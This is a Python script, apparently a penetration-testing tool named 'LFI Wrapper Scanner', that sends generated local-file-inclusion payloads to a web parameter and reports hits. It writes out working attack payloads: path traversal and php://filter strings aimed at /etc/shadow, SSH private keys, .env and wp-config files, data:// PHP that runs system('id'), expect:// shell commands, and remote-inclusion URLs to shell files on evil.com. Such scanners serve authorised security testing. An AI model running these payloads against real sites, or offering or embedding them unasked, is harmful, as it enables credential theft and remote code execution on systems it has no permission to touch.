#!/usr/bin/env python3

import requests
import sys
import base64
import urllib.parse
import os
import argparse
from datetime import datetime
import re

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class LFIWrapperScanner:
    def __init__(self, proxy: str = None, target_dir: str = None, follow_redirects: bool = False):
        self.proxy = self._setup_proxy(proxy)
        self.target_dir = target_dir
        self.detected_php_version = None
        self.follow_redirects = follow_redirects
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        requests.packages.urllib3.disable_warnings()
        self.session.verify = False
        
        if self.proxy:
            self.session.proxies.update(self.proxy)

    def _setup_proxy(self, proxy: str):
        if proxy:
            return {'http': proxy, 'https': proxy}
        
        env_proxies = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy']
        for env_var in env_proxies:
            if env_proxy := os.getenv(env_var):
                self.print_status("Detected env proxy.", 'info')
                return {'http': env_proxy, 'https': env_proxy}
        
        return None

    def print_status(self, message: str, msg_type: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        color_map = {
            'info': Color.BLUE,
            'success': Color.GREEN,
            'warning': Color.YELLOW,
            'error': Color.RED,
            'testing': Color.CYAN,
            'verified': Color.MAGENTA,
            'payload': Color.WHITE
        }
        
        color = color_map.get(msg_type, Color.WHITE)
        print(f"{Color.BOLD}[{timestamp}]{Color.END} {color}{message}{Color.END}")

    def detect_php_version(self, target_url: str):
        version_indicators = []
        
        php_info_files = [
            '/phpinfo.php',
            '/info.php',
            '/test.php',
            '/version.php',
            '/status.php',
            '/server-status',
            '/.phpinfo',
            '/admin/phpinfo.php',
            '/debug/phpinfo.php',
        ]
        
        version_headers = [
            'X-Powered-By',
            'Server',
            'X-PHP-Version',
        ]
        
        self.print_status("Attempting to detect PHP version...", 'testing')
        
        for php_file in php_info_files:
            try:
                test_url = target_url.rstrip('/') + php_file
                response = self.session.get(test_url, timeout=3, verify=False, allow_redirects=self.follow_redirects)
                
                if response.status_code == 200:
                    version_patterns = [
                        r'PHP Version ([\d\.]+)',
                        r'<h1 class="p">PHP ([\d\.]+)',
                        r'php/([\d\.]+)',
                        r'PHP_([\d_]+)',
                        r'<tr><td class="e">PHP Version </td><td class="v">([\d\.]+)',
                    ]
                    
                    for pattern in version_patterns:
                        matches = re.search(pattern, response.text, re.IGNORECASE)
                        if matches:
                            version = matches.group(1).replace('_', '.')
                            version_indicators.append({
                                'source': f'File: {php_file}',
                                'version': version,
                                'confidence': 'high'
                            })
            except:
                pass
        
        try:
            response = self.session.get(target_url, timeout=3, verify=False, allow_redirects=self.follow_redirects)
            for header in version_headers:
                if header in response.headers:
                    header_value = response.headers[header]
                    version_match = re.search(r'PHP/([\d\.]+)', header_value, re.IGNORECASE)
                    if version_match:
                        version = version_match.group(1)
                        version_indicators.append({
                            'source': f'Header: {header}',
                            'version': version,
                            'confidence': 'medium'
                        })
        except:
            pass
        
        return version_indicators

    def assess_vulnerabilities_by_version(self, php_version: str):
        vulnerabilities = {
            '5.6': [
                'End-of-life - no security support',
                'Multiple known RCE vulnerabilities',
                'Deserialization vulnerabilities',
                'Buffer overflows',
                'Weak filter protections'
            ],
            '7.0': [
                'End-of-life - no security support',
                'Type confusion vulnerabilities',
                'Use-after-free issues',
                'Moderate filter restrictions'
            ],
            '7.1': [
                'End-of-life - no security support',
                'Various memory corruption issues',
                'Moderate filter restrictions'
            ],
            '7.2': [
                'End-of-life - no security support',
                'Some known CVEs present',
                'Stronger filter protections'
            ],
            '7.3': [
                'Security support ended recently',
                'Consider upgrading to 7.4+',
                'Strong wrapper restrictions'
            ],
            '7.4': [
                'Active security support',
                'Some wrapper restrictions',
                'Good security posture'
            ],
            '8.0': [
                'Active security support',
                'Improved security features',
                'Strict wrapper validation'
            ],
            '8.1': [
                'Latest stable versions',
                'Best security posture',
                'Strong filter protections'
            ],
            '8.2': [
                'Latest stable versions', 
                'Best security posture',
                'Strong filter protections'
            ],
            '8.3': [
                'Latest stable versions',
                'Best security posture',
                'Strong filter protections'
            ]
        }
        
        detected_version = None
        for version in vulnerabilities.keys():
            if php_version.startswith(version):
                detected_version = version
                break
        
        if detected_version:
            return vulnerabilities[detected_version]
        return ["Unknown version - cannot assess vulnerabilities"]

    def generate_wrappers(self, test_file: str = "/etc/passwd"):
        wrappers = []
        
        basic_wrappers = [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16/resource=',
            'php://filter/convert.iconv.utf-8.utf-16be/resource=',
            'php://filter/convert.iconv.utf-16.utf-8/resource=',
            'php://filter/convert.iconv.utf-16le.utf-8/resource=',
            'php://filter/convert.iconv.utf-8.utf-7/resource=',
            'php://filter/convert.iconv.utf-7.utf-8/resource=',
            'php://filter/convert.iconv.utf-8.utf-32/resource=',
            'php://filter/convert.iconv.utf-32.utf-8/resource=',
            'php://filter/convert.iconv.latin1.utf-8/resource=',
            'php://filter/convert.iconv.utf-8.latin1/resource=',
            'php://filter/convert.iconv.iso-8859-1.utf-8/resource=',
            'php://filter/convert.iconv.utf-8.iso-8859-1/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/resource=',
            'php://filter/zlib.inflate/convert.base64-encode/resource=',
            'php://filter/bzip2.compress/convert.base64-encode/resource=',
            'php://filter/bzip2.decompress/convert.base64-encode/resource=',
            'php://filter/read=string.rot13/resource=',
            'php://filter/string.rot13/resource=',
            'php://filter/convert.quoted-printable-encode/resource=',
            'php://filter/read=convert.quoted-printable-encode/resource=',
            'php://filter/convert.quoted-printable-decode/resource=',
            'php://filter/string.strip_tags/resource=',
            'php://filter/string.toupper/resource=',
            'php://filter/string.tolower/resource=',
            'php://filter/convert.base64-decode/resource=',
        ]
        
        complex_wrappers = [
            'php://filter/convert.base64-encode|convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
            'php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/convert.base64-encode/resource=',
            'php://filter/read=string.rot13|string.rot13|convert.base64-encode/resource=',
            'php://filter/convert.quoted-printable-encode|convert.base64-encode/resource=',
            'php://filter/string.toupper|convert.base64-encode/resource=',
            'php://filter/string.tolower|convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16|string.rot13|convert.base64-encode/resource=',
            'php://filter/string.strip_tags|convert.base64-encode/resource=',
        ]
        
        traversal_payloads = [
            '../../../../../../../../../../../../../../../../../../../../../../',
            '../../../../../../../../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../',
            '../../../',
            '..//..//..//..//..//..//..//..//..//..//etc/passwd',
            '..////..////..////..////..////etc/passwd',
            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f',
            '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af',
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f',
            '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af',
            '..\\..\\..\\..\\..\\..\\..\\..\\',
            '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c',
            '..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c',
            '..\\/..\\/..\\/..\\/..\\/..\\/..\\/',
            '..//\\..//\\..//\\..//\\..//\\',
            '....//....//....//....//....//....//....//',
            '..///..///..///..///..///..///..///',
            '.../.../.../.../.../.../.../.../etc/passwd',
            '..%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%00',
        ]
        
        test_files = [
            '/etc/passwd',
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '/etc/passwd\\0',
            '/etc/passwd\\\\0',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/group',
            '/etc/hostname',
            '/etc/issue',
            '/etc/motd',
            '/etc/resolv.conf',
            '/etc/nsswitch.conf',
            '/etc/sysctl.conf',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/version',
            '/proc/cmdline',
            '/proc/mounts',
            '/proc/net/arp',
            '/proc/net/tcp',
            '/proc/net/udp',
            '/proc/self/stat',
            '/proc/self/status',
            '/proc/self/fd/0',
            '/proc/self/fd/1',
            '/proc/self/fd/2',
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/nginx/access.log',
            '/var/log/httpd/access_log',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages',
            '/var/log/secure',
            '/var/log/mail.log',
            '/var/log/dmesg',
            '/etc/ssh/sshd_config',
            '/etc/mysql/my.cnf',
            '/etc/php/8.2/apache2/php.ini',
            '/etc/php/7.4/apache2/php.ini',
            '/etc/php/5.6/apache2/php.ini',
            '/etc/apache2/apache2.conf',
            '/etc/apache2/sites-available/000-default.conf',
            '/etc/nginx/nginx.conf',
            '/etc/hosts.allow',
            '/etc/hosts.deny',
            '/.env',
            '/.htaccess',
            '/web.config',
            '/config/database.php',
            '/wp-config.php',
            '/application/config/database.php',
            '/includes/config.php',
            '/config/config.php',
            '/settings.php',
            '/configuration.php',
            '/var/lib/php/sessions/sess_',
            '/tmp/sess_',
            '/var/lib/php5/sess_',
            '/var/lib/php7/sess_',
            '/dev/null',
            '/dev/zero',
            '/dev/random',
            '/dev/urandom',
            'c:\\windows\\system32\\drivers\\etc\\hosts',
            'c:/windows/system32/drivers/etc/hosts',
            'c:\\boot.ini',
            'c:/boot.ini',
            'c:\\windows\\win.ini',
            'c:/windows/win.ini',
            'c:\\windows\\system32\\config\\sam',
            'c:/windows/system32/config/sam',
            '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/home/.bash_history',
            '/root/.bash_history',
            '/etc/skel/.bashrc',
            '/root/.ssh/id_rsa',
            '/root/.ssh/authorized_keys',
            '/home/user/.ssh/id_rsa',
            '/etc/passwd.bak',
            '/etc/shadow.bak',
            '/var/backups/passwd.bak',
            '/var/backups/shadow.bak',
            'wp-config.php.bak',
            'database.php.bak',
        ]
        
        advanced_payloads = self.generate_advanced_wrappers()
        test_files.extend(advanced_payloads)
        
        if self.target_dir:
            test_files.insert(0, self.target_dir)
            for traversal in traversal_payloads[:5]:
                test_files.append(traversal + self.target_dir.lstrip('/'))
        
        test_content = base64.b64encode(b"<?php echo 'VULNERABLE'; ?>").decode()
        test_content2 = base64.b64encode(b"<?php system('id'); ?>").decode()
        data_wrappers = [
            f'data://text/plain;base64,{test_content}',
            f'data://text/plain;base64,{test_content2}',
            'data://text/plain,' + urllib.parse.quote("<?php echo 'VULNERABLE'; ?>"),
            'data://text/plain;charset=us-ascii,' + urllib.parse.quote("<?php echo 'TEST'; ?>"),
            'data://text/plain;charset=base64,' + test_content,
            'data://text/php;base64,' + test_content,
            'data://text/php,' + urllib.parse.quote("<?php echo 'VULNERABLE'; ?>"),
            'data://,<?php echo "TEST"; ?>',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        ]
        
        expect_wrappers = [
            'expect://whoami',
            'expect://id',
            'expect://ls',
            'expect://pwd',
            'expect://uname -a',
            'expect://cat /etc/passwd',
            'expect://ls -la /',
            'expect://ifconfig',
            'expect://ip addr',
            'expect://netstat -an',
            'expect://ps aux',
            'expect://echo "VULNERABLE"',
            'expect://whoami;id;uname -a',
        ]
        
        rfi_wrappers = [
            'http://evil.com/shell.txt',
            'https://raw.githubusercontent.com/evil/shell/master/shell.php',
            'ftp://user:pass@evil.com/shell.txt',
            'phar://evil.com/shell.phar',
            'http://localhost:8080/shell.php',
        ]
        
        phar_wrappers = [
            'phar:///path/to/archive.phar/file.txt',
            'phar://./archive.phar/file.txt',
        ]
        
        zip_wrappers = [
            'zip:///path/to/archive.zip%23file.txt',
            'zip://./archive.zip%23file.txt',
        ]
        
        for wrapper in basic_wrappers:
            for file in test_files:
                wrappers.append(wrapper + file)
        
        for wrapper in complex_wrappers:
            for file in test_files:
                wrappers.append(wrapper + file)
        
        for traversal in traversal_payloads:
            for file in test_files:
                wrappers.append(traversal + file)
                for basic_wrapper in basic_wrappers[:5]:
                    wrappers.append(basic_wrapper + traversal + file)
        
        wrappers.extend(data_wrappers)
        wrappers.extend(expect_wrappers)
        wrappers.extend(rfi_wrappers)
        wrappers.extend(phar_wrappers)
        wrappers.extend(zip_wrappers)
        
        if self.detected_php_version:
            version_specific = self.generate_version_specific_wrappers(self.detected_php_version)
            for wrapper in version_specific:
                for file in test_files[:10]:
                    wrappers.append(wrapper + file)
        
        return list(set(wrappers))

    def generate_advanced_wrappers(self):
        advanced_payloads = []
        
        double_encoded = [
            '....//....//....//....//....//etc/passwd',
            '..%255c..%255c..%255c..%255cwindows\\win.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',
            '..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
        ]
        
        windows_paths = [
            '..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'c:\\windows\\system32\\config\\sam',
            '..%5c..%5c..%5c..%5c..%5cboot.ini',
            '..//..//..//..//..//windows/win.ini',
        ]
        
        log_poisoning = [
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log', 
            '/var/log/httpd/access_log',
            '/var/log/auth.log',
            '/var/www/logs/access.log',
            'C:\\xampp\\apache\\logs\\access.log',
        ]
        
        config_files = [
            '/.htpasswd',
            '/.git/config',
            '/.env.local',
            '/app/config/parameters.yml',
            '/var/www/html/wp-config.php',
            '/config/config.inc.php',
            '/etc/apache2/.htpasswd',
        ]
        
        session_files = [
            '/tmp/sess_1234567890',
            '/var/lib/php5/sess_1234567890',
            '/var/lib/php/sessions/sess_1234567890',
        ]
        
        advanced_payloads.extend(double_encoded)
        advanced_payloads.extend(windows_paths)
        advanced_payloads.extend(log_poisoning)
        advanced_payloads.extend(config_files)
        advanced_payloads.extend(session_files)
        
        return advanced_payloads

    def generate_version_specific_wrappers(self, php_version: str):
        version_specific = []
        
        if php_version.startswith('5.'):
            version_specific.extend([
                'php://input',
                'file:///etc/passwd',
                'php://filter/read=convert.base64-encode/resource=',
                'expect://id',
                'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+',
            ])
        
        if php_version.startswith('7.0') or php_version.startswith('7.1'):
            version_specific.extend([
                'php://filter/convert.base64-encode/resource=',
                'php://filter/zlib.deflate/convert.base64-encode/resource=',
                'php://filter/string.rot13/resource=',
            ])
        
        if php_version.startswith('7.2') or php_version.startswith('7.3'):
            version_specific.extend([
                'php://filter/convert.base64-encode|convert.base64-encode/resource=',
                'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
            ])
        
        if php_version.startswith('7.4') or php_version.startswith('8.'):
            version_specific.extend([
                'php://filter/convert.base64-encode/resource=',
                'php://filter/convert.quoted-printable-encode/resource=',
            ])
        
        return version_specific

    def verify_vulnerability(self, content: str, wrapper: str):
        false_positives = [
            '<!DOCTYPE html>',
            '<html',
            '</html>',
            '<head>',
            '</head>',
            '<body>',
            '</body>',
            'window.location',
            'HTTP Status 404',
            '404 Not Found',
            'Error 404',
            'Page not found',
        ]
        
        content_lower = content.lower()
        if any(fp.lower() in content_lower for fp in false_positives[:5]):
            return None
        
        indicators = {
            'root:x:0:0': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/passwd'},
            'root:*:': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/shadow'},
            'daemon:x:1:1': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/passwd'},
            '127.0.0.1': {'confidence': 'medium', 'type': 'LFI', 'file': '/etc/hosts'},
            'root:': {'confidence': 'medium', 'type': 'LFI', 'file': '/etc/group'},
            'Linux': {'confidence': 'medium', 'type': 'LFI', 'file': '/proc/version'},
            'PATH=': {'confidence': 'high', 'type': 'LFI', 'file': '/proc/self/environ'},
            'localhost': {'confidence': 'medium', 'type': 'LFI', 'file': 'hosts'},
            '[boot loader]': {'confidence': 'high', 'type': 'LFI', 'file': 'boot.ini'},
            '[extensions]': {'confidence': 'medium', 'type': 'LFI', 'file': 'win.ini'},
            'VULNERABLE': {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper'},
            'TEST': {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper'},
            'cm9vdDp4OjA6MA': {'confidence': 'high', 'type': 'LFI', 'file': 'base64 /etc/passwd'},
            'ZGFlbW9u': {'confidence': 'high', 'type': 'LFI', 'file': 'base64 /etc/passwd'},
            'uid=': {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'},
            'www-data': {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'},
            '/home/': {'confidence': 'medium', 'type': 'RCE', 'file': 'command execution'},
            'apache': {'confidence': 'medium', 'type': 'RCE', 'file': 'command execution'},
            'nginx': {'confidence': 'medium', 'type': 'RCE', 'file': 'command execution'},
            'GET /': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
            'POST /': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
            'HTTP/': {'confidence': 'medium', 'type': 'LFI', 'file': 'access log'},
            'AllowUsers': {'confidence': 'medium', 'type': 'LFI', 'file': 'sshd_config'},
            'extension=': {'confidence': 'medium', 'type': 'LFI', 'file': 'php.ini'},
            'DB_HOST': {'confidence': 'medium', 'type': 'LFI', 'file': 'config file'},
            'database': {'confidence': 'medium', 'type': 'LFI', 'file': 'config file'},
            'BEGIN RSA PRIVATE KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'SSH private key'},
            'BEGIN OPENSSH PRIVATE KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'SSH private key'},
            'USER=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
            'PWD=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
            'HOME=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
            'PHP Version': {'confidence': 'high', 'type': 'RCE', 'file': 'phpinfo'},
            'database_password': {'confidence': 'high', 'type': 'LFI', 'file': 'config file'},
            'API_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'environment file'},
            'SECRET_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'secret key'},
            'AWS_ACCESS_KEY': {'confidence': 'high', 'type': 'LFI', 'file': 'AWS credentials'},
            'ssh-rsa': {'confidence': 'high', 'type': 'LFI', 'file': 'SSH public key'},
            '-----BEGIN PRIVATE KEY-----': {'confidence': 'high', 'type': 'LFI', 'file': 'private key'},
        }
        
        for pattern, info in indicators.items():
            if pattern in content:
                return info
        
        if len(content) > 20 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n\r' for c in content[:200]):
            try:
                decoded = base64.b64decode(content[:400]).decode('utf-8', errors='ignore')
                for pattern, info in indicators.items():
                    if pattern in decoded:
                        return info
                if 'root:' in decoded or '<?php' in decoded or 'Linux' in decoded:
                    return {'confidence': 'medium', 'type': 'LFI', 'file': 'base64 encoded content'}
            except:
                pass
        
        def rot13(text):
            result = []
            for char in text:
                if 'a' <= char <= 'z':
                    result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
                elif 'A' <= char <= 'Z':
                    result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
                else:
                    result.append(char)
            return ''.join(result)
        
        rot13_content = rot13(content[:500])
        for pattern, info in indicators.items():
            if pattern in rot13_content:
                return {'confidence': 'high', 'type': 'LFI', 'file': f"ROT13 encoded {info['file']}"}
        
        if wrapper.startswith('expect://'):
            if 'www-data' in content or 'root' in content or 'uid=' in content:
                return {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'}
            if 'VULNERABLE' in content:
                return {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'}
        
        if wrapper.startswith('data://'):
            if 'VULNERABLE' in content or 'TEST' in content:
                return {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper execution'}
            if 'PHP Version' in content:
                return {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper phpinfo'}
        
        return None

    def enhanced_verify_vulnerability(self, content: str, wrapper: str, response):
        verification = self.verify_vulnerability(content, wrapper)
        if not verification:
            return None

        suspicious_headers = {
            'X-Powered-By': 'Reveals backend technology',
            'Server': 'Reveals server version',
            'X-Debug-Token': 'Debug mode enabled',
        }
    
        header_info = []
        for header, desc in suspicious_headers.items():
            if header in response.headers:
                header_info.append(f"{header}: {response.headers[header]} - {desc}")
    
        if header_info:
            verification['headers'] = header_info
    
        return verification

    def generate_reproduction_steps(self, target_url: str, parameter: str, wrapper: str, verification_info: dict):
        separator = '&' if '?' in target_url else '?'
        encoded_payload = urllib.parse.quote(wrapper)
        full_url = f"{target_url}{separator}{parameter}={encoded_payload}"
    
        steps = [
            f"{Color.BOLD}Reproduction Steps:{Color.END}",
            f"1. {Color.GREEN}Execute request:{Color.END}",
            f"   {Color.CYAN}curl -k '{full_url}'{Color.END}",
            f"   {Color.CYAN}or{Color.END}",
            f"   {Color.CYAN}wget --no-check-certificate '{full_url}'{Color.END}",
            "",
            f"2. {Color.GREEN}In browser:{Color.END}",
            f"   {Color.CYAN}{full_url}{Color.END}",
            "",
            f"3. {Color.GREEN}Justification:{Color.END}",
        ]
    
        if wrapper.startswith('php://filter'):
            steps.append(f"   {Color.YELLOW}PHP filter wrapper allows file reading through base64 conversion{Color.END}")
            steps.append(f"   {Color.YELLOW}Script bypassed file system access restrictions{Color.END}")
        elif wrapper.startswith('data://'):
            steps.append(f"   {Color.YELLOW}Data wrapper enables PHP code execution via data URI{Color.END}")
            steps.append(f"   {Color.YELLOW}Server processes data:// content as PHP code{Color.END}")
        elif wrapper.startswith('expect://'):
            steps.append(f"   {Color.YELLOW}Expect wrapper executes system commands{Color.END}")
            steps.append(f"   {Color.YELLOW}Demonstrates remote code execution (RCE){Color.END}")
        elif '/etc/passwd' in wrapper or 'etc/passwd' in wrapper:
            steps.append(f"   {Color.YELLOW}Successful reading of /etc/passwd confirms LFI{Color.END}")
            steps.append(f"   {Color.YELLOW}Path traversal allows access outside root directory{Color.END}")
        elif 'proc/self' in wrapper:
            steps.append(f"   {Color.YELLOW}Access to /proc/self reveals process information{Color.END}")
            steps.append(f"   {Color.YELLOW}Can lead to environment variables disclosure{Color.END}")
    
        steps.extend([
            "",
            f"4. {Color.GREEN}Impact:{Color.END}",
            f"   {Color.RED}{verification_info['type']} - {self.get_impact_description(verification_info['type'])}{Color.END}",
        ])
    
        return "\n".join(steps)

    def get_impact_description(self, vuln_type: str):
        impacts = {
            'LFI': 'Local File Inclusion - reading sensitive system files',
            'RCE': 'Remote Code Execution - executing arbitrary code on server',
            'RFI': 'Remote File Inclusion - loading remote files',
            'Directory Traversal': 'Browsing arbitrary directories',
        }
        return impacts.get(vuln_type, 'Unknown vulnerability type')

    def generate_report(self, target_url: str, parameter: str, vulnerabilities: list):
        report = [
            f"# LFI Vulnerability Report",
            f"Target: {target_url}",
            f"Parameter: {parameter}",
            f"Scan date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"PHP version: {self.detected_php_version or 'Unknown'}",
            f"",
            f"## Summary",
            f"Found {len(vulnerabilities)} vulnerable payloads",
            f"",
            f"## Vulnerabilities",
        ]
    
        for i, vuln in enumerate(vulnerabilities, 1):
            report.extend([
                f"### Vulnerability #{i}",
                f"- **Type**: {vuln['type']}",
                f"- **Confidence**: {vuln['confidence']}",
                f"- **Payload**: `{vuln['wrapper']}`",
                f"- **File accessed**: {vuln.get('file', 'Unknown')}",
                f"",
                f"#### Reproduction Steps",
                f"```bash",
                f"curl -k '{target_url}?{parameter}={urllib.parse.quote(vuln['wrapper'])}'",
                f"```",
                f"",
                f"#### Impact",
                f"{self.get_impact_description(vuln['type'])}",
                f"",
                f"---",
            ])
    
        return "\n".join(report)

    def save_report(self, report: str, filename: str = None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"lfi_scan_report_{timestamp}.md"
    
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
    
        self.print_status(f"Report saved to: {filename}", 'success')

    def test_payload(self, target_url: str, parameter: str, wrapper: str):
        separator = '&' if '?' in target_url else '?'
        test_url = f"{target_url}{separator}{parameter}={urllib.parse.quote(wrapper)}"
    
        try:
            response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=self.follow_redirects)
        
            if response.status_code == 200 and len(response.text) > 0:
                verification = self.enhanced_verify_vulnerability(response.text, wrapper, response)
                if verification:
                    color = Color.RED if verification['confidence'] == 'high' else Color.YELLOW
                    self.print_status(f"✓ VULNERABLE - Parameter: {parameter}", 'success')
                    self.print_status(f"  → Type: {verification['type']} | Confidence: {verification['confidence']} | File: {verification['file']}", 'verified')
                
                    reproduction_steps = self.generate_reproduction_steps(target_url, parameter, wrapper, verification)
                    print(reproduction_steps)
                
                    self.print_status("Response preview:", 'info')
                    preview = response.text[:500] + "..." if len(response.text) > 500 else response.text
                    print(f"{Color.CYAN}{preview}{Color.END}")
                
                    return {
                        'wrapper': wrapper,
                        'type': verification['type'],
                        'confidence': verification['confidence'],
                        'file': verification.get('file', 'Unknown'),
                        'response_preview': preview
                    }
        
            self.print_status(f"✗ Not vulnerable - Payload: {wrapper[:100]}...", 'error')
            
        except Exception as e:
            self.print_status(f"✗ Failed - Payload: {wrapper} ({str(e)})", 'error')
    
        return None

    def scan(self, target_url: str, parameter: str, export_report: bool = True):
        self.print_status(f"Starting LFI scan: {target_url}", 'info')
        self.print_status(f"Testing parameter: {parameter}", 'info')
        if self.proxy:
            self.print_status(f"Using proxy: {self.proxy}", 'info')
        if self.target_dir:
            self.print_status(f"Target directory: {self.target_dir}", 'info')
        if self.follow_redirects:
            self.print_status("Follow redirects: ENABLED", 'info')
        else:
            self.print_status("Follow redirects: DISABLED", 'info')
        self.print_status("SSL verification: DISABLED (self-signed certs supported)", 'info')
        print("-" * 60)
    
        version_info = self.detect_php_version(target_url)
        vulnerabilities = []
    
        if version_info:
            for info in version_info:
                self.print_status(f"PHP version detected: {info['version']} ({info['source']})", 'success')
                self.detected_php_version = info['version']
            
                vulns = self.assess_vulnerabilities_by_version(info['version'])
                self.print_status("Version-based vulnerability assessment:", 'warning')
                for vuln in vulns:
                    self.print_status(f"  • {vuln}", 'warning')
        else:
            self.print_status("Could not detect PHP version", 'error')
            self.detected_php_version = "unknown"
    
        print("-" * 60)
    
        try:
            response = self.session.get(target_url, timeout=5, verify=False, allow_redirects=self.follow_redirects)
            self.print_status(f"Initial connection: HTTP {response.status_code}", 'info')
        except Exception as e:
            self.print_status(f"Connection failed: {e}", 'error')
            return
    
        wrappers = self.generate_wrappers()
        self.print_status(f"Generated {len(wrappers)} payloads for testing", 'info')
    
        for i, wrapper in enumerate(wrappers, 1):
            self.print_status(f"Testing payload {i}/{len(wrappers)}", 'payload')
            result = self.test_payload(target_url, parameter, wrapper)
            if result:
                vulnerabilities.append(result)
    
        print("-" * 60)
        if vulnerabilities:
            self.print_status(f"Scan complete! Found {len(vulnerabilities)} vulnerable payloads", 'success')
        
            if export_report:
                report = self.generate_report(target_url, parameter, vulnerabilities)
                self.save_report(report)
        else:
            self.print_status("Scan complete! No vulnerabilities found", 'warning')

    def show_banner(self):
        banner = f"""
{Color.CYAN}
                           _          _____      
 __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
 \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
                    |_|         |_|              
{Color.END}
        {Color.YELLOW}LFI Wrapper Scanner{Color.END}
        {Color.BLUE}PHP Wrapper-based LFI Detection Tool{Color.END}
        {Color.MAGENTA}Author: csshark{Color.END}
        
        """
        print(banner)

def main():
    parser = argparse.ArgumentParser(description='LFI Wrapper Scanner')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('param', help='Parameter to test')
    parser.add_argument('--proxy', '-p', help='Proxy (http://proxy:port)')
    parser.add_argument('--target-dir', '-t', help='Target directory for wrapper traversal')
    parser.add_argument('--no-report', action='store_true', help='Disable report generation')
    parser.add_argument('--follow-redirects', '-fr', action='store_true', help='Follow HTTP redirects')
    
    if len(sys.argv) == 1:
        parser.print_help()
        return
    
    args = parser.parse_args()
    
    scanner = LFIWrapperScanner(proxy=args.proxy, target_dir=args.target_dir, follow_redirects=args.follow_redirects)
    scanner.show_banner()
    
    if args.proxy:
        scanner.proxy = {'http': args.proxy, 'https': args.proxy}
        scanner.session.proxies.update(scanner.proxy)
    
    scanner.scan(args.url, args.param, export_report=not args.no_report)

if __name__ == "__main__":
    main()
